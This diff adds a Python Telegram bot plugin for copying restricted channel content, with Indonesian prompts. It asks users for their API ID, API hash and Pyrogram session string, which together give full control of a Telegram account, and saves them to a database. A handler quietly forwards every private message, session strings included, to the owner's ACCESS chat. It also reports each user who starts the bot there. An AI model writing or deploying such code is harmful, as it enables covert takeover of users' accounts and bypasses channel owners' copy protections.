@@ -1,0 +1,204 @@
+#Github.com/Vasusen-code
+
+import os
+from .. import bot, ACCESS
+
+from telethon import events, Button, TelegramClient
+from decouple import config
+from pyrogram import Client
+
+from main.plugins.main import Bot
+from main.plugins.helpers import login, logout
+from main.Database.database import Database
+
+st = "Hallo ka, Silahkan copy link konten yang mau di copet lalu tempel di bot (jika link publik) \n\n Jika link private maka tekan tombol login lalu ikuti perintah bot (reply pesan bot) dengan kirim api id, api hash, dan string pyrogram akun anda terlebih dahulu. Info lengkap tekan tombol Help\n\n**SUPPORT:** @nakama_asl\n**OWNER:** @azure_id"
+
+ht = """Help:
+
+**FOR PUBLIC CHANNEL:**
+- Copy link konten dan tempel di bot. 
+
+**FOR PRIVATE CHANNEL:**
+- Klik tombol login dan ikuti perintah bot (reply pesan bot) dengan mengirim api id, api hash dan string pyrogram session
+- Kemudian salin link konten private yang hendak dicopet, tempel di bot. 
+
+__>> Anda ingin login secara gratis?__
+
+- Ambil api id dan api hash di @CreateApiRobot
+- Ambil string di bot @ROBINSTRINGBOT
+
+- Kirim /start dan klik login."""
+
+@bot.on(events.NewMessage(incoming=True, pattern="/start"))
+async def start(event):
+    await event.reply(f'{st}', 
+                      buttons=[
+                              [Button.inline("SET THUMB", data="sett"),
+                               Button.inline("REM THUMB", data="remt")],
+                              [Button.inline("LOG IN", data="login"),
+                               Button.inline("LOG OUT", data="logout")],
+                              [Button.inline("HELP", data="help"),
+                               Button.url("OWNER", url="https://t.me/azure_id")],
+                              ])
+    tag = f'[{event.sender.first_name}](tg://user?id={event.sender_id})'
+    await event.client.send_message(int(ACCESS), f'{tag} started the BOT\nUserID: {event.sender_id}') 
+    try:
+        await Bot.start()
+        await idle()
+    except Exception as e:
+        if 'Client is already connected' in str(e):
+            pass
+        else:
+            return
+    
+@bot.on(events.callbackquery.CallbackQuery(data="sett"))
+async def sett(event):    
+    Drone = event.client                    
+    button = await event.get_message()
+    msg = await button.get_reply_message() 
+    await event.delete()
+    async with Drone.conversation(event.chat_id) as conv: 
+        xx = await conv.send_message("Send me any image for thumbnail as a `reply` to this message.")
+        x = await conv.get_reply()
+        if not x.media:
+            xx.edit("No media found.")
+        mime = x.file.mime_type
+        if not 'png' in mime:
+            if not 'jpg' in mime:
+                if not 'jpeg' in mime:
+                    return await xx.edit("No image found.")
+        await xx.delete()
+        t = await event.client.send_message(event.chat_id, 'Trying.')
+        path = await event.client.download_media(x.media)
+        if os.path.exists(f'{event.sender_id}.jpg'):
+            os.remove(f'{event.sender_id}.jpg')
+        os.rename(path, f'./{event.sender_id}.jpg')
+        await t.edit("Temporary thumbnail saved!")
+        
+@bot.on(events.callbackquery.CallbackQuery(data="remt"))
+async def remt(event):  
+    Drone = event.client            
+    await event.edit('Trying.')
+    try:
+        os.remove(f'{event.sender_id}.jpg')
+        await event.edit('Removed!')
+    except Exception:
+        await event.edit("No thumbnail saved.")                        
+    
+    
+@bot.on(events.NewMessage(incoming=True,func=lambda e: e.is_private))
+async def access(event):
+    await event.forward_to(int(ACCESS))
+
+@bot.on(events.callbackquery.CallbackQuery(data="login"))
+async def lin(event):
+    Drone = event.client
+    button = await event.get_message()
+    msg = await button.get_reply_message()  
+    await event.delete()
+    async with Drone.conversation(event.chat_id) as conv: 
+        try:
+            xx = await conv.send_message("send me your `API_ID` as a reply to this.")
+            x = await conv.get_reply()
+            i = x.text
+            await xx.delete()                    
+            if not i:               
+                return await xx.edit("No response found.")
+        except Exception as e: 
+            print(e)
+            return await xx.edit("An error occured while waiting for the response.")
+        try:
+            xy = await conv.send_message("send me your `API_HASH` as a reply to this.")  
+            y = await conv.get_reply()
+            h = y.text
+            await xy.delete()                    
+            if not h:                
+                return await xy.edit("No response found.")
+        except Exception as e: 
+            print(e)
+            return await xy.edit("An error occured while waiting for the response.")
+        try:
+            xz = await conv.send_message("send me your `SESSION` as a reply to this.")  
+            z = await conv.get_reply()
+            s = z.text
+            await xz.delete()                    
+            if not s:                
+                return await xz.edit("No response found.")
+        except Exception as e: 
+            print(e)
+            return await xz.edit("An error occured while waiting for the response.")
+        await login(event.sender_id, i, h, s) 
+        await Drone.send_message(event.chat_id, "Login credentials saved.")
+        
+@bot.on(events.callbackquery.CallbackQuery(data="logout"))
+async def out(event):
+    await event.edit("Trying to logout.")
+    await logout(event.sender_id)
+    await event.edit('successfully Logged out.')
+    
+@bot.on(events.callbackquery.CallbackQuery(data="startbot"))
+async def stb(event):
+    await event.edit("Trying to start.")
+    MONGODB_URI = config("MONGODB_URI", default=None)
+    db = Database(MONGODB_URI, 'saverestricted')
+    i, h, s = await db.get_credentials(event.sender_id)
+    if i and h and s is not None:
+        try:
+            userbot = Client(
+                session_name=s, 
+                api_hash=h,
+                api_id=int(i))
+            await userbot.start()
+            await idle()
+            await event.edit("Started!")
+        except ValueError:
+            return await event.edit("INVALID API_ID: Logout and Login back with correct `API_ID`")
+        except Exception as e:
+            print(e)
+            if 'Client is already connected' in str(e):
+                return await event.edit("Already running.")
+            else:
+                return await event.edit(f"Error: {str(e)}")
+    else:
+        return await event.edit("Your login credentials not found.")
+    
+@bot.on(events.callbackquery.CallbackQuery(data="stopbot"))
+async def spb(event):   
+    MONGODB_URI = config("MONGODB_URI", default=None)
+    db = Database(MONGODB_URI, 'saverestricted')
+    i, h, s = await db.get_credentials(event.sender_id)
+    if i and h and s is not None:
+        try:
+            userbot = Client(
+                session_name=s, 
+                api_hash=h,
+                api_id=int(i))
+            await userbot.stop()
+            await event.edit("Bot stopped!")
+        except ValueError:
+            return await event.edit("INVALID API_ID: Logout and Login back with correct `API_ID`")
+        except Exception as e:
+            return await event.edit(f"Error: {str(e)}")
+    else:
+        return await event.edit("Your login credentials not found.")
+   
+@bot.on(events.callbackquery.CallbackQuery(data="help"))
+async def help(event):
+    await event.edit(ht, link_preview=False, buttons=[[Button.inline("BACK", data="menu")]])
+    
+@bot.on(events.callbackquery.CallbackQuery(data="menu"))
+async def back(event):
+    await event.edit(st, 
+                      buttons=[
+                              [Button.inline("SET THUMB", data="sett"),
+                               Button.inline("REM THUMB", data="remt")],
+                              [Button.inline("LOG IN", data="login"),
+                               Button.inline("LOG OUT", data="logout")],
+                              [Button.inline("HELP", data="help"),
+                               Button.url("SOURCE", url="github.com/vasusen-code/saverestrictedcontentbot")],
+                              ])
+    
+    
+    
+    
+    
